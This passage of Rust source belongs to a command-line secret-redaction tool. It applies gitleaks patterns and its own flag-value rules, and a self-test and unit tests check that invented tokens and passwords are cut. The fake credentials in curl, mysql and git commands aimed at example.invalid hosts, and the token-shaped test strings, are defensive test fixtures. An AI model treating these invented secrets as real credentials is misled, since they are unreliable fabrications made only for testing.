                Value::Null => false,
                v => v.as_bool().ok_or(format!(
                    "{kind} has a value_follows that is not true or false"
                ))?,
            };
            rules.push(Rule {
                kind: kind.to_string(),
                re: compile(rx).map_err(|e| format!("{kind} does not compile: {e}"))?,
                keywords: strings(&r["keywords"], kind)?
                    .into_iter()
                    .map(&mut keyword)
                    .collect(),
                entropy: 0.0,
                group: 0,
                allows: Vec::new(),
                gitleaks: false,
                value_follows,
            });
        }
        let gate = AhoCorasick::builder()
            .ascii_case_insensitive(true)
            .build(&keywords)
            .map_err(|e| format!("the keywords: {e}"))?;
        Ok(Set {
            rules,
            global,
            gate,
            words,
            evaluated,
            file_bound,
            allowlists_dropped: dropped,
        })
    }

    /// Planted invented secrets, one of each form, that must be cut with their kind each time
    /// the set loads: a set that loads and cuts nothing is not taken for one that works.
    fn self_test(&self) -> Result<(), String> {
        for (args, kind, secret) in PLANTED {
            let cut = Args(cut_with(
                Some(self),
                args.iter().map(|a| text_pieces(a)).collect(),
            ));
            let shown = cut.shown(str::to_string).concat();
            if shown.contains(secret) || !cut.cuts().iter().any(|c| c.kind == *kind) {
                return Err(format!("the planted secret of {kind} was not cut"));
            }
        }
        Ok(())
    }

    /// Whether this set cuts by `kind`: a pattern's, or one of the core's own.
    fn knows(&self, kind: &str) -> bool {
        [FLAG_VALUE, TOO_LONG, NO_PATTERNS].contains(&kind)
            || self.rules.iter().any(|r| r.kind == kind)
    }

    /// A source's text as pieces, each exemption apart: a well-formed mark of a kind this set
    /// cuts, bare or with its backslash doubled as JSON writes it, and a kind this set cuts as
    /// the core prints it in a list of cuts (`"kind":"<kind>"`), each a piece quoted; the rest
    /// text. A mark of another kind, and a kind in any other place, is text read as any other
    /// text is: its kind could be a secret, and `<kind>=<value>` is a name and its value.
    fn quoted(&self, s: &str) -> Vec<Piece> {
        let mut exempt: Vec<(usize, usize)> = marks(s)
            .into_iter()
            .filter(|(_, _, kind, _)| self.knows(kind))
            .map(|(start, end, ..)| {
                let doubled = s[..start].ends_with('\\');
                (start - usize::from(doubled), end)
            })
            .collect();
        static LISTED: OnceLock<Regex> = OnceLock::new();
        let listed = LISTED
            .get_or_init(|| compile(r#""kind"\s*:\s*"([a-z0-9:._-]+)""#).expect("a fixed pattern"));
        for c in listed.captures_iter(s.as_bytes()) {
            let kind = c.get(1).expect("the group of the kind");
            if self.knows(&s[kind.start()..kind.end()]) {
                exempt.push((kind.start(), kind.end()));
            }
        }
        exempt.sort_unstable();
        let mut out = Vec::new();
        let mut at = 0;
        for (start, end) in exempt {
            if start > at {
                out.push(Piece::Text(s[at..start].to_string()));
            }
            out.push(Piece::Quoted(s[start..end].to_string()));
            at = end;
        }
        if at < s.len() {
            out.push(Piece::Text(s[at..].to_string()));
        }
        out
    }

    /// The spans the patterns take as secrets in `line`, a reading of the line `words` were read
    /// from, with the kind of each, placed in that line by `at`, which gives the place there of
    /// each byte of `line`. A value that follows its key is looked for only in the reading that
    /// keeps the line's places, given `inert`, the exempt spans it holds as blanks: the value then begins at the end of its key,
    /// or at the first exempt span the key's match runs into, and is read on the line itself.
    fn spans(
        &self,
        line: &str,
        words: &Words,
        at: impl Fn(usize) -> usize,
        inert: Option<&[(usize, usize)]>,
    ) -> Vec<(usize, usize, String)> {
        let place = |s: usize, e: usize| (at(s), at(e));
        let bytes = line.as_bytes();
        let found: BTreeSet<usize> = self
            .gate
            .find_overlapping_iter(bytes)
            .map(|m| m.pattern().as_usize())
            .collect();
        let breaks: Vec<usize> = line
            .bytes()
            .enumerate()
            .filter(|(_, b)| *b == b'\n')
            .map(|(i, _)| i)
            .collect();
        let mut out = Vec::new();
        for r in &self.rules {
            if !r.keywords.is_empty() && !r.keywords.iter().any(|k| found.contains(k)) {
                continue;
            }
            if r.value_follows {
                let Some(inert) = inert else {
                    continue;
                };
                // The value begins where the match ends, in the argument it begins in; its key
                // is the group `key`, or the whole match.
                for c in r.re.captures_iter(bytes) {
                    let m = c.get(0).expect("a match has its whole");
                    let vs = inert
                        .iter()
                        .map(|e| e.0)
                        .find(|s| (m.start()..m.end()).contains(s))
                        .unwrap_or(m.end());
                    // The arguments cover the line, so every end is in one of them.
                    let arg = words.bounds.partition_point(|b| b.1 < vs);
                    // A key in an earlier argument is before this one's first space too.
                    let key = c.name("key").map_or(m.start(), |k| k.start());
                    let ve = words.value_end(arg, key, vs);
                    if vs < ve {
                        out.push((vs, ve, r.kind.clone()));
                    }
                }
                continue;
            }
            for m in r.re.find_iter(bytes) {
                // gitleaks trims newlines off a match.
                let raw = &bytes[m.start()..m.end()];
                let lead = raw.iter().take_while(|b| **b == b'\n').count();
                let trail = raw[lead..]
                    .iter()
                    .rev()
                    .take_while(|b| **b == b'\n')
                    .count();
                let (ms, me) = (floor(line, m.start() + lead), ceil(line, m.end() - trail));
                if ms >= me {
                    continue;
                }
                let matched = &line[ms..me];
                // The secret: the rule's secret group, or else its first non-empty group, as
                // the regular expression gives them over the match alone; else the match.
                let (ss, se) = match r.re.captures(matched.as_bytes()) {
                    Some(c) if c.len() >= 2 => {
                        let g = if r.group > 0 {
                            c.get(r.group)
                        } else {
                            (1..c.len())
                                .filter_map(|i| c.get(i))
                                .find(|g| !g.is_empty())
                        };
                        match g.filter(|g| !g.is_empty()) {
                            Some(g) => (floor(line, ms + g.start()), ceil(line, ms + g.end())),
                            None => (ms, me),
                        }
                    }
                    _ => (ms, me),
                };
                let secret = &line[ss..se];
                if r.entropy != 0.0 && entropy(secret) <= r.entropy {
                    continue;
                }
                let around = line_of(line, &breaks, ms, me);
                let allowed = |a: &Allow| allowed(a, secret, matched, around);
                if (r.gitleaks && self.global.iter().any(allowed)) || r.allows.iter().any(allowed) {
                    continue;
                }
                let (ss, se) = place(ss, se);
                out.push((ss, se, r.kind.clone()));
            }
        }
        out
    }

    /// Values of names a word names: a name at each `=` or `:` of a word, taken from the word's
    /// start or from the `=`, `:`, `&` or `?` before it (`--name=value`, `name:value`,
    /// `--set=db.password=value`, `user=a&password=value`), and a flag `--name` whose value is
    /// the next word of its argument or, standing alone, the next argument. Names are read from
    /// the same words the values are, with their quotes taken off (`"--password" value`). A name
    /// holds only letters, digits, `_`, `-` and `.`, so a word inside a path or another word
    /// (`find-generic-password`) is never one. After a flag with no `=` or `:`, a word that
    /// begins with `-` is the next flag, never a value; after `=` or `:` the value is taken
    /// whatever it begins with. Where each value ends is `value_end`'s.
    fn flag_values(&self, words: &Words) -> Vec<(usize, usize, String)> {
        let mut out = Vec::new();
        let named = |name: &str| {
            name.bytes()
                .all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b'-' || b == b'.')
                && {
                    let name = plain_name(name);
                    self.words.iter().any(|w| w.matches(&name))
                }
        };
        // A value is the text after `vs`; `dash` says whether, unquoted, it begins with `-`.
        let mut value = |arg: usize, key: usize, vs: usize, dash: bool| {
            if !dash {
                let ve = words.value_end(arg, key, vs);
                if vs < ve {
                    out.push((vs, ve, FLAG_VALUE.to_string()));
                }
            }
        };
        for (i, list) in words.words.iter().enumerate() {
            for (t, w) in list.iter().enumerate() {
                let text = w.text.as_str();
                let bare = text.trim_start_matches('-');
                let from = text.len() - bare.len();
                let mut name = from;
                for (p, b) in text.bytes().enumerate().skip(from) {
                    match b {
                        b'=' | b':' => {
                            if named(&text[name..p]) {
                                let vs = w.at.get(p).map_or(w.end, |at| at + 1);
                                value(i, w.start, vs, false);
                            }
                            name = p + 1;
                        }
                        b'&' | b'?' => name = p + 1,
                        _ => {}
                    }
                }
                if from > 0 && !bare.contains(['=', ':']) && named(bare) {
                    match list.get(t + 1) {
                        Some(n) => value(i, w.start, n.start, n.text.starts_with('-')),
                        None => {
                            if let Some(n) = words.words.get(i + 1).and_then(|l| l.first()) {
                                value(i + 1, n.start, n.start, n.text.starts_with('-'));
                            }
                        }
                    }
                }
            }
        }
        out
    }
}

/// One word of an argument as a shell reads it: where it begins and ends in the line, its text
/// with the quotes and escapes taken off, and where in the line each byte of that text is.
struct Word2 {
    start: usize,
    end: usize,
    text: String,
    at: Vec<usize>,
}

/// The words of each argument of a line, read once, so that names and values come from the
/// same reading and where a value ends is the one decision `Words::value_end` makes, for every
/// form of the core's own, at the cost of a lookup.
struct Words {
    bounds: Vec<(usize, usize)>,
    /// The words of each argument.
    words: Vec<Vec<Word2>>,
    /// For each byte of the line, where the shell word it is in ends: the end of its argument
    /// from where the reading stopped following the shell.
    end: Vec<usize>,
    /// For each argument, where its first whitespace is, or its end.
    space: Vec<usize>,
}

/// Whether the shell text at `rest` is a construct this reader does not follow exactly, so that
/// no word ends after it in its argument: a backtick, `$(`, `${`, `$[`, `$'` and a process
/// substitution (`<(`, `>(`), whatever quote it stands in. A backslash before a character no
/// shell needs escaped is one too, as is a quote never closed. Rather than follow more of the
/// shell, more is cut. What a shell splits otherwise is followed: a here-string's word is an
/// ordinary word, a here-document's body is input and no value, and a brace expansion keeps its
/// spaces quoted or escaped.
fn unfollowed(rest: &[u8]) -> bool {
    rest.first() == Some(&b'`')
        || [b"$(", b"${", b"$[", b"$'", b"<(", b">("]
            .iter()
            .any(|s| rest.starts_with(*s))
}

impl Words {
    /// Each argument read from its start as a shell reads a word: quotes and backslash escapes
    /// followed. From the first thing it cannot follow (`unfollowed`), no word ends before the
    /// argument does, and the rest is split at whitespace only, so the names in it are still
    /// found and each of their values runs to the end of the argument. A mark, the core's or one
    /// a source quoted, at `marks`, is one piece of a word that adds nothing to its text: a value
    /// already cut, never part of a name.
    fn new(line: &str, bounds: &[(usize, usize)], marks: &[(usize, usize)]) -> Words {
        let b = line.as_bytes();
        let mut end = vec![line.len(); line.len() + 1];
        let mut space = Vec::with_capacity(bounds.len());
        let mut all = Vec::with_capacity(bounds.len());
        for &(a0, a1) in bounds {
            space.push(
                b[a0..a1]
                    .iter()
                    .position(u8::is_ascii_whitespace)
                    .map_or(a1, |p| a0 + p),
            );
            let mut list: Vec<Word2> = Vec::new();
            // The word being read: its start, its text's bytes and where each is.
            let mut cur: Option<(usize, Vec<u8>, Vec<usize>)> = None;
            let mut boundary = vec![false; a1 - a0];
            let mut quote: Option<u8> = None;
            let mut stop = a1;
            let mut i = a0;
            while i < a1 {
                let c = b[i];
                if quote.is_none() && c.is_ascii_whitespace() {
                    boundary[i - a0] = true;
                    if let Some(w) = cur.take() {
                        list.push(word(w, i));
                    }
                    i += 1;
                    continue;
                }
                let w = cur.get_or_insert_with(|| (i, Vec::new(), Vec::new()));
                if let Ok(m) = marks.binary_search_by_key(&i, |m| m.0) {
                    i = marks[m].1;
                    continue;
                }
                if unfollowed(&b[i..a1]) {
                    stop = i;
                    break;
                }
                match (quote, c) {
                    (None | Some(b'"'), b'\\') => match b.get(i + 1).filter(|_| i + 1 < a1) {
                        Some(&n) if n.is_ascii_whitespace() || b"'\"\\$`".contains(&n) => {
                            w.1.push(n);
                            w.2.push(i + 1);
                            i += 1;
                        }
                        _ => {
                            stop = i;
                            break;
                        }
                    },
                    (None, b'\'' | b'"') => quote = Some(c),
                    (Some(q), c) if c == q => quote = None,
                    _ => {
                        w.1.push(c);
                        w.2.push(i);
                    }
                }
                i += 1;
            }
            if stop == a1 && quote.is_some() {
                // A quote never closed is not followed either: the word it is in is read again
                // from its start as what follows is.
                if let Some(w) = cur.take() {
                    stop = w.0;
                }
            }
            // From `stop`, words are split at whitespace only, the one being read continued, and
            // quotes are left out of their text, so a name in quotes is still a name.
            let mut j = stop;
            while j < a1 {
                if b[j].is_ascii_whitespace() {
                    if let Some(w) = cur.take() {
                        list.push(word(w, j));
                    }
                } else {
                    let w = cur.get_or_insert_with(|| (j, Vec::new(), Vec::new()));
                    if let Ok(m) = marks.binary_search_by_key(&j, |m| m.0) {
                        j = marks[m].1;
                        continue;
                    }
                    if !b"'\"".contains(&b[j]) {
                        w.1.push(b[j]);
                        w.2.push(j);
                    }
                }
                j += 1;
            }
            if let Some(w) = cur.take() {
                list.push(word(w, a1));
            }
            let mut next = a1;
            for i in (a0..a1).rev() {
                if boundary[i - a0] {
                    next = i;
                }
                end[i] = next;
            }
            all.push(list);
        }
        Words {
            bounds: bounds.to_vec(),
            words: all,
            end,
            space,
        }
    }

    /// Where a value that begins at `vs` ends, in the argument `arg`, for the key or flag that
    /// begins at `key`, the same whatever the value begins with. When the key starts the
    /// argument, the argument is one word a program was given, and the value is the rest of it,
    /// spaces and all. Inside a longer text, such as a command line given as one argument, the
    /// value is one shell word, to the end of the argument where its quoting cannot be followed.
    /// When unsure, more is cut.
    fn value_end(&self, arg: usize, key: usize, vs: usize) -> usize {
        let a1 = self.bounds[arg].1;
        if key <= self.space[arg] {
            return a1;
        }
        self.end[vs].min(a1)
    }
}

/// The invented secrets of the self-test: the arguments, the kind that must cut them, and the
/// secret.
const PLANTED: &[(&[&str], &str, &str)] = &[
    (
        // Split, so that no scanner takes this source for one that holds a token.
        &[
            "tool",
            concat!("gh", "p_Fk7Qz2Lm9Xw4Rt8Yp3Vn6Bc1Hd5Js0Ga7Ke2"),
        ],
        "gitleaks:github-pat",
        concat!("gh", "p_Fk7Qz2Lm9Xw4Rt8Yp3Vn6Bc1Hd5Js0Ga7Ke2"),
    ),
    (
        &["node", "app.js", "--password", "Fake-Pa55word"],
        FLAG_VALUE,
        "Fake-Pa55word",
    ),
    (
        &[
            "git",
            "clone",
            "https://someone:FakePassw0rd@git.example.invalid/r.git",
        ],
        "detect-secrets:basic-auth",
        "FakePassw0rd",
    ),
    (
        &[
            "curl",
            "-H",
            "Authorization: Bearer FAKEexample0opaque1token2",
            "https://example.invalid",
        ],
        "immune:authorization",
        "FAKEexample0opaque1token2",
    ),
    (
        &["mysql", "-u", "root", "-pFakePassw0rdExample", "app"],
        "immune:mysql-password",
        "FakePassw0rdExample",
    ),
];

/// A word read, ending at `end`. Only ASCII quotes and backslashes are left out of its bytes, so
/// they stay UTF-8.
fn word((start, bytes, at): (usize, Vec<u8>, Vec<usize>), end: usize) -> Word2 {
    Word2 {
        start,
        end,
        text: String::from_utf8_lossy(&bytes).into_owned(),
        at,
    }
}

fn allowed(a: &Allow, secret: &str, matched: &str, line: &str) -> bool {
    let target = match a.target {
        Target::Secret => secret,
        Target::Match => matched,
        Target::Line => line,
    };
    let by_regex = a.regexes.iter().any(|r| r.is_match(target.as_bytes()));
    let by_word = a
        .stopwords
        .as_ref()
        .is_some_and(|w| w.is_match(&secret.to_lowercase()));
    if a.and {
        let mut checks = Vec::new();
        if !a.regexes.is_empty() {
            checks.push(by_regex);
        }
        if a.stopwords.is_some() {
            checks.push(by_word);
        }
        if a.other {
            checks.push(false);
        }
        !checks.is_empty() && checks.iter().all(|c| *c)
    } else {
        by_regex || by_word
    }
}

/// gitleaks's `shannonEntropy`: counted per character, over the length in bytes.
fn entropy(s: &str) -> f64 {
    if s.is_empty() {
        return 0.0;
    }
    let mut counts: std::collections::BTreeMap<char, usize> = Default::default();
    for c in s.chars() {
        *counts.entry(c).or_default() += 1;
    }
    let n = s.len() as f64;
    counts
        .values()
        .map(|&c| {
            let f = c as f64 / n;
            -f * f.log2()
        })
        .sum()
}

/// The line of `text` the span is on, as gitleaks's `line` target reads it, by where its
/// newlines are.
fn line_of<'a>(text: &'a str, breaks: &[usize], s: usize, e: usize) -> &'a str {
    let start = match breaks.partition_point(|b| *b < s) {
        0 => 0,
        i => breaks[i - 1] + 1,
    };
    let end = breaks
        .get(breaks.partition_point(|b| *b < e))
        .copied()
        .unwrap_or(text.len());
    &text[start..end]
}

fn floor(t: &str, mut i: usize) -> usize {
    while !t.is_char_boundary(i) {
        i -= 1;
    }
    i
}

fn ceil(t: &str, mut i: usize) -> usize {
    while !t.is_char_boundary(i) {
        i += 1;
    }
    i
}

#[cfg(test)]
mod tests {
    use super::*;

    // Every secret here is invented. Token-shaped ones are made when the test runs, a prefix and
    // a body in the shape gitleaks's own generator gives (`utils.GenerateSampleSecret`), so no
    // literal in the source looks like a real token.

    fn strings(args: &[&str]) -> Vec<String> {
        args.iter().map(|a| a.to_string()).collect()
    }

    /// `n` characters of `charset`, the same for the same seed.
    fn body(charset: &str, n: usize, seed: u64) -> String {
        let chars: Vec<char> = charset.chars().collect();
        let mut x = seed
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        (0..n)
            .map(|_| {
                x = x
                    .wrapping_mul(6364136223846793005)
                    .wrapping_add(1442695040888963407);
                chars[((x >> 33) as usize) % chars.len()]
            })
            .collect()
    }

    const ALNUM: &str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const LOWER: &str = "abcdefghijklmnopqrstuvwxyz0123456789";
    const HEX: &str = "0123456789abcdef";

    /// One invented secret in the shape of each of these rules of gitleaks's, and the arguments
    /// that hold it.
    fn samples() -> Vec<(&'static str, Vec<String>, String)> {
        let token = |prefix: &[&str], charset: &str, n: usize, seed: u64| {
            format!("{}{}", prefix.concat(), body(charset, n, seed))
        };
        let alone = |t: String| (vec!["tool".to_string(), t.clone()], t);
        let mut out = vec![
            ("github-pat", alone(token(&["gh", "p_"], ALNUM, 36, 1))),
            ("gitlab-pat", alone(token(&["gl", "pat-"], ALNUM, 20, 2))),
            (
                "aws-access-token",
                alone(token(
                    &["AK", "IA"],
                    "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",
                    16,
                    3,
                )),
            ),
            (
                "npm-access-token",
                alone(token(&["np", "m_"], LOWER, 36, 4)),
            ),
            (
                "slack-bot-token",
                alone(format!(
                    "{}{}-{}-{}",
                    ["xo", "xb-"].concat(),
                    body("0123456789", 12, 5),
                    body("0123456789", 12, 6),
                    body(ALNUM, 24, 7)
                )),
            ),
            (
                "anthropic-api-key",
                alone(format!(
                    "{}{}AA",
                    ["sk-ant-", "api03-"].concat(),
                    body(ALNUM, 93, 8)
                )),
            ),
            (
                "digitalocean-pat",
                alone(token(&["dop_", "v1_"], HEX, 64, 9)),
            ),
            (
                "vault-service-token",
                alone(token(&["hv", "s."], ALNUM, 95, 10)),
            ),
            (
                "pypi-upload-token",
                alone(token(&["pypi-AgEI", "cHlwaS5vcmc"], ALNUM, 60, 11)),
            ),
            (
                "age-secret-key",
                alone(token(
                    &["AGE-SECRET-", "KEY-1"],
                    "QPZRY9X8GF2TVDW0S3JN54KHCE6MUA7L",
                    58,
                    12,
                )),
            ),
            (
                "sendgrid-api-token",
                alone(token(&["S", "G."], ALNUM, 66, 13)),
            ),
            (
                "huggingface-access-token",
                alone(token(&["h", "f_"], "abcdefghijklmnopqrstuvwxyz", 34, 14)),
            ),
            (
                "jwt",
                alone(format!(
                    "eyJ{}.eyJ{}.{}",
                    body(ALNUM, 20, 15),
                    body(ALNUM, 24, 16),
                    body(ALNUM, 30, 17)
                )),
            ),
        ]
        .into_iter()
        .map(|(id, (args, secret))| (id, args, secret))
        .collect::<Vec<_>>();
        let password = body(ALNUM, 16, 18);
        out.push((
            "curl-auth-user",
            strings(&[
                "curl",
                "-u",
                &format!("someone:{password}"),
                "https://example.invalid",
            ]),
            password,
        ));
        let key = body(ALNUM, 24, 19);
        out.push((
            "generic-api-key",
            strings(&["sh", "-c", &format!("export API_KEY={key} && make")]),
            key,
        ));
        out
    }

    fn kinds(a: &Args) -> Vec<String> {
        a.cuts().into_iter().map(|c| c.kind).collect()
    }

    fn plain(a: &Args) -> Vec<String> {
        a.shown(str::to_string)
    }

    #[test]
    fn every_pattern_of_gitleaks_that_is_not_bound_to_a_file_compiles_and_the_set_loads_whole() {
        // 217 of the 222 rules apply to a command line; 5 are bound to a file's path. RE2 takes
        // 4 allowlist expressions `regex` refuses for a literal brace; without them more is cut,
        // and a set that drops more is noticed here.
        let s = set().unwrap();
        assert_eq!(
            (s.evaluated, s.file_bound, s.allowlists_dropped),
            (217, 5, 4)
        );
    }

    #[test]
    fn a_secret_in_the_shape_of_a_rule_is_cut_with_that_rule_named_and_nothing_of_it_is_shown() {
        for (id, args, secret) in samples() {
            let a = Args::raw(&args);
            let shown = plain(&a).concat();
            assert!(!shown.contains(&secret), "{id}: {shown}");
            assert!(
                kinds(&a).contains(&format!("gitleaks:{id}")),
                "{id}: {:?}",
                a.cuts()
            );
        }
    }

    #[test]
    fn ordinary_command_lines_are_left_as_they_are() {
        // Hashes, ids, flags with secret-sounding names that are not secrets, and the forms the
        // core's own rules must stay silent on.
        for args in [
            &[
                "git",
                "checkout",
                "3f786850e387550fdab836ed7e6dc881de23001b",
            ][..],
            &["git", "commit", "-m", "fix the parser"],
            &["kubectl", "get", "secret", "app-config", "-n", "default"],
            &["security", "find-generic-password", "-wa", "Chrome"],
            &["tool", "--token-count", "42"],
            &["tool", "--max-tokens", "512"],
            &["tool", "--session-name", "deploy"],
            &["tool", "--password", "-v"],
            &["node", "--max-old-space-size=4096", "server.js"],
            &[
                "open",
                // Split, as every token-shaped sample here is.
                concat!(
                    "https://example.invalid/?id=123e4567-",
                    "e89b-12d3-a456-426614174000"
                ),
            ],
            &[
                "git",
                "clone",
                "ssh://git@git.example.invalid:22/org/repo.git",
            ],
            &["git", "clone", "git@git.example.invalid:org/repo.git"],
            &[
                "curl",
                "-H",
                "Accept: application/json",
                "https://example.invalid",
            ],
            &["mysql", "-u", "root", "-p", "app"],
            &["mysql", "-P", "3306", "-h", "db.example.invalid"],
            &["ls", "-pF"],
            &["npm", "install", "--save-dev", "typescript"],
            &[
                "shasum",
                "-a",
                "256",
                "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            ],
        ] {
            let a = Args::raw(&strings(args));
            assert!(a.cuts().is_empty(), "{args:?}: {:?}", a.cuts());
            assert_eq!(plain(&a), args);
        }
    }

    #[test]
    fn the_forms_gitleaks_misses_on_a_command_line_are_cut_by_the_command_line_rules() {
        // Each of the core's own forms, with the secret and the kind that must cut it. The
        // flag, the user name and the scheme stay.
        for (args, kind, secret, kept) in [
            (
                &["node", "app.js", "--password", "Fake pass phrase"][..],
                FLAG_VALUE,
                "Fake pass phrase",
                "--password",
            ),
            (
                &["sysadminctl", "-addUser", "x", "-password", "FakePw1"],
                FLAG_VALUE,
                "FakePw1",
                "-password",
            ),
            (
                &["runner", "config", "--token=FAKE0runner1token"],
                FLAG_VALUE,
                "FAKE0runner1token",
                "--token=",
            ),
            (
                &["openssl", "enc", "-pass", "pass:FakePw2"],
                FLAG_VALUE,
                "FakePw2",
                "-pass",
            ),
            (
                &["sh", "-c", "mysql --password 'Fake pw 3' db"],
                FLAG_VALUE,
                "Fake pw 3",
                "--password",
            ),
            (
                &["env", "DB_PASSWORD=FakePw4", "app"],
                FLAG_VALUE,
                "FakePw4",
                "DB_PASSWORD=",
            ),
            (
                &[
                    "git",
                    "clone",
                    "https://someone:FakePw5@git.example.invalid/r.git",
                ],
                "detect-secrets:basic-auth",
                "FakePw5",
                "https://someone:",
            ),
            (
                &[
                    "curl",
                    "-H",
                    "Authorization: Bearer FAKEopaque6token",
                    "https://example.invalid",
                ],
                "immune:authorization",
                "FAKEopaque6token",
                "Authorization: Bearer ",
            ),
            (
                &[
                    "curl",
                    "-H",
                    "authorization:FAKEopaque7token",
                    "https://example.invalid",
                ],
                "immune:authorization",
                "FAKEopaque7token",
                "authorization:",
            ),
            (
                &["/usr/local/bin/mysql", "-u", "root", "-pFakePw8", "app"],
                "immune:mysql-password",
                "FakePw8",
                "-p",
            ),
            (
                &["sh", "-c", "mariadb-dump -h db -pFakePw9 app > a.sql"],
                "immune:mysql-password",
                "FakePw9",
                "-p",
            ),
        ] {
            let a = Args::raw(&strings(args));
            let shown = plain(&a).join(" ");
            assert!(!shown.contains(secret), "{args:?}: {shown}");
            assert!(shown.contains(kept), "{args:?}: {shown}");
            assert!(
                kinds(&a).iter().any(|k| k == kind),
                "{args:?}: {:?}",
                a.cuts()
            );
        }
    }

    #[test]
    fn only_the_secret_is_replaced_and_the_program_the_flag_the_key_and_the_delimiter_stay() {
        let pw = body(ALNUM, 16, 20);
        let a = Args::raw(&strings(&[
            "curl",
            "-u",
            &format!("someone:{pw}"),
            "https://example.invalid",
        ]));
        assert_eq!(
            plain(&a),
            [
                "curl",
                "-u",
                "\\cut{gitleaks:curl-auth-user 24}",
                "https://example.invalid"
            ]
        );
        let key = body(ALNUM, 24, 21);
        let a = Args::raw(&strings(&[
            "sh",
            "-c",
            &format!("export API_KEY={key} && make"),
        ]));
        assert_eq!(
            plain(&a),
            [
                "sh",
                "-c",
                "export API_KEY=\\cut{gitleaks:generic-api-key 24} && make"
            ]
        );
    }

    #[test]
    fn a_cut_stays_inside_its_argument_and_the_arguments_keep_their_count() {
        // A private key's block crosses three arguments; each part is cut in its own argument,
        // and the space that joined them is no argument's.
        let args = strings(&[
            "tool",
            "-----BEGIN PRIVATE KEY-----",
            &body(ALNUM, 64, 22),
            "-----END PRIVATE KEY-----",
            "--out",
            "a.pem",
        ]);
        let a = Args::raw(&args);
        assert_eq!(a.0.len(), args.len());
        let shown = plain(&a);
        assert_eq!(
            (&shown[0], &shown[4], &shown[5]),
            (
                &"tool".to_string(),
                &"--out".to_string(),
                &"a.pem".to_string()
            )
        );
        let cut: Vec<usize> = a.cuts().iter().map(|c| c.argument).collect();
        assert_eq!(cut, [1, 2, 3]);
        assert_eq!(
            a.cuts().iter().map(|c| c.length).collect::<Vec<_>>(),
            [27, 64, 25]
        );
    }

    #[test]
    fn the_marks_in_the_text_and_the_list_of_cuts_agree_kind_by_kind() {
        let mut args = Vec::new();
        for (_, a, _) in samples() {
            args.extend(a);
        }
        args.extend(strings(&["--password", "FakePw10"]));
        let a = Args::raw(&args);
        let mut from_marks = Vec::new();
        for (argument, text) in a.store().iter().enumerate() {
            for p in parse(text) {
                if let Piece::Cut { kind, length } = p {
                    from_marks.push(Cut {
                        argument,
                        kind,
                        length,
                    });
                }
            }
        }
        assert_eq!(from_marks, a.cuts());
        assert_eq!(a.cuts().len(), samples().len() + 1);
    }

    #[test]
    fn a_secret_across_the_cap_of_a_report_s_text_shows_no_part_of_it() {
        // The cut comes before the 256 characters a report's text is cut to, so the cap never
        // leaves the first part of a secret it would have split.
        let token = format!("{}{}", ["gh", "p_"].concat(), body(ALNUM, 36, 23));
        let arg = format!("{}={token}", "x".repeat(240));
        let shown =
            crate::status::capped(Args::raw(&[arg]).shown(crate::view::shown).pop().unwrap());
        assert!(!shown.contains("ghp"), "{shown}");
        assert!(!shown.contains(&token[4..10]), "{shown}");
    }

    #[test]
    fn what_is_kept_reads_back_as_it_was_cut_and_a_source_never_writes_a_mark() {
        // In the store a source's backslash is `\u{5c}`, so a mark spelled out in an argument is
        // text, never a cut, and reads back as the argument it was.
        let token = format!("{}{}", ["gh", "p_"].concat(), body(ALNUM, 36, 24));
        let args = strings(&[
            "echo",
            "\\cut{gitleaks:github-pat 40}",
            "C:\\u{41}\\x",
            &token,
        ]);
        let kept = Args::raw(&args);
        let back = Args::stored(&kept.store(), Form::Cut);
        assert_eq!(back, kept);
        assert_eq!(kinds(&back), ["gitleaks:github-pat"]);
        assert_eq!(&plain(&back)[..3], &args[..3]);
    }

    #[test]
    fn a_row_kept_before_a_secret_was_recognised_is_cut_when_it_is_shown() {
        // Rows of an older build hold arguments as the log gave them; rows of an older set hold
        // what it did not know. Both are cut when they are read.
        let token = format!("{}{}", ["gh", "p_"].concat(), body(ALNUM, 36, 25));
        let args = strings(&["tool", &token]);
        for form in [Form::Raw, Form::Cut] {
            assert_eq!(kinds(&Args::stored(&args, form)), ["gitleaks:github-pat"]);
        }
        // A backslash an older build kept as it was is a backslash, not an escape.
        assert_eq!(
            plain(&Args::stored(&strings(&["a\\u{41}"]), Form::Raw)),
            ["a\\u{41}"]
        );
    }

    #[test]
    fn a_mark_is_never_cut_again() {
        // Whatever kind a mark names, and whatever stands before it, a mark read back stays one
        // cut and nothing around it is cut.
        let set = set().unwrap();
        let mut all: Vec<String> = set.rules.iter().map(|r| r.kind.clone()).collect();
        all.extend([FLAG_VALUE, TOO_LONG, NO_PATTERNS].map(str::to_string));
        for kind in all {
            let m = mark(&kind, 40);
            let stored = strings(&[
                "tool",
                &m,
                &format!("--password={m}"),
                "--token",
                &m,
                &format!("API_KEY={m}"),
            ]);
            let a = Args::stored(&stored, Form::Cut);
            assert_eq!(a.cuts().len(), 4, "{kind}: {:?}", a.cuts());
            assert_eq!(a.store(), stored, "{kind}");
            let said = format!("said --password {m}");
            assert_eq!(Kept::Said.read(Form::Cut, &said).store(), said);
        }
    }

    #[test]
    fn a_line_longer_than_the_cap_is_withheld_whole_with_a_mark_of_its_own() {
        let long = "x".repeat(LINE_CAP);
        let a = Args::raw(&strings(&["tool", &long]));
        assert_eq!(plain(&a), [mark(TOO_LONG, 4), mark(TOO_LONG, LINE_CAP)]);
        // At the cap it is searched.
        let a = Args::raw(&strings(&["tool", &long[..LINE_CAP - 5]]));
        assert!(a.cuts().is_empty());
    }

    #[test]
    fn without_a_set_every_argument_is_withheld_whole_and_nothing_is_taken_as_clean() {
        // A set that did not load is the leak's counterpart of false calm: nothing falls back to
        // the text as it was.
        let args = vec![
            vec![Piece::Text("tool".into())],
            Vec::new(),
            vec![Piece::Text("é-x".into())],
        ];
        assert_eq!(
            cut_with(None, args),
            [
                vec![Piece::Cut {
                    kind: NO_PATTERNS.into(),
                    length: 4
                }],
                Vec::new(),
                vec![Piece::Cut {
                    kind: NO_PATTERNS.into(),
                    length: 3
                }],
            ]
        );
        // A row kept cut reads back with its own marks and nothing more.
        let kept = "\\cut{gitleaks:github-pat 40}";
        assert_eq!(
            cut_with(None, vec![parse(kept)]),
            [vec![Piece::Cut {
                kind: "gitleaks:github-pat".into(),
                length: 40
            }]]
        );
        assert!(holds_in(Err("not loaded"), "plain words").is_err());
        assert_eq!(holds_in(set(), "plain words"), Ok(false));
